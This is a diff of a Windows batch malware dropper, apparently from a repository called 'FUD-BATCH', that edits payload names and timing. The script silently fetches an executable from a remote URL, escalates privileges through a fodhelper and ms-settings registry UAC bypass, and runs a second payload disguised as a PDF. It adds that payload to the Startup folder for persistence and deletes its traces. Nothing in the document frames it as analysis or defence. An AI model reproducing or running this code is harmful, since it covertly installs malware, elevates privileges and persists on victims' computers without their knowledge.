@@ -2,22 +2,22 @@
 setlocal
 
 :: Set the download URL and the target paths
-set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Zone.zip"
-set "zip_output=C:\Users\%USERNAME%\AppData\Zone.zip"
-set "exe_output=C:\Users\%USERNAME%\AppData\Zone.exe"
+set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/sammur.zip"
+set "zip_output=C:\Users\%USERNAME%\AppData\sammur.zip"
+set "exe_output=C:\Users\%USERNAME%\AppData\sammur.exe"
 
-:: Download the Zone.zip file using PowerShell silently
+:: Download the sammur.zip file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%zip_output%'" >nul 2>&1
 
 :: Check if the download was successful
 if exist "%zip_output%" (
-    :: Extract Zone.exe from Zone.zip silently
+    :: Extract sammur.exe from sammur.zip silently
     powershell -command "Expand-Archive -Path '%zip_output%' -DestinationPath 'C:\Users\%USERNAME%\AppData\' -Force" >nul 2>&1
 ) else (
     exit /b 1
 )
 
-:: Check if extraction was successful (Zone.exe exists)
+:: Check if extraction was successful (sammur.exe exists)
 if exist "%exe_output%" (
     rem Extraction successful, proceed
 ) else (
@@ -30,20 +30,20 @@ reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f >nul 2>&1
 :: Set the DelegateExecute property silently
 reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1
 
-:: Wait for 12 seconds silently
-timeout /t 12 /nobreak >nul 2>&1
+:: Wait for 4 seconds silently
+timeout /t 4 /nobreak >nul 2>&1
 
-:: Set the default value to run Zone.exe silently
+:: Set the default value to run sammur.exe silently
 reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "%exe_output%" /f >nul 2>&1
 
-:: Wait for another 12 seconds silently
-timeout /t 12 /nobreak >nul 2>&1
+:: Wait for another 4 seconds silently
+timeout /t 4 /nobreak >nul 2>&1
 
 :: Start fodhelper.exe silently to escalate privileges
 start /min "" "C:\Windows\System32\fodhelper.exe" >nul 2>&1
 
-:: Wait for 12 seconds silently
-timeout /t 12 /nobreak >nul 2>&1
+:: Wait for 4 seconds silently
+timeout /t 8 /nobreak >nul 2>&1
 
 :: Set the download URL and the target path for Client.pdf
 set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
@@ -59,7 +59,7 @@ if exist "%output2%" (
     exit /b 1
 )
 
-:: Convert client.pdf to client.exe by renaming silently
+:: Convert Client.pdf to sam.exe by renaming silently
 ren "%output2%" "sam.exe" >nul 2>&1
 
 :: Run sam.exe two times silently
@@ -70,7 +70,7 @@ start /min "" "%output2:pdf=exe%" >nul 2>&1
 :: Wait for 3 seconds before deleting files
 timeout /t 3 /nobreak >nul 2>&1
 
-:: Delete Zone.exe and Zone.zip
+:: Delete sammur.exe and sammur.zip
 del "%exe_output%" >nul 2>&1
 del "%zip_output%" >nul 2>&1
 
@@ -81,8 +81,8 @@ powershell -command "Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse 
 set "startup_folder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 copy "%output2:pdf=exe%" "%startup_folder%\sam.exe" >nul 2>&1
 
-:: Delete the expert.bat file in AppData if it exists
-set "expert_bat=C:\Users\%USERNAME%\AppData\expert.bat"
+:: Delete the expert.bat file in ProgramData if it exists
+set "expert_bat=C:\ProgramData\expert.bat"
 if exist "%expert_bat%" (
     del "%expert_bat%" >nul 2>&1
 )
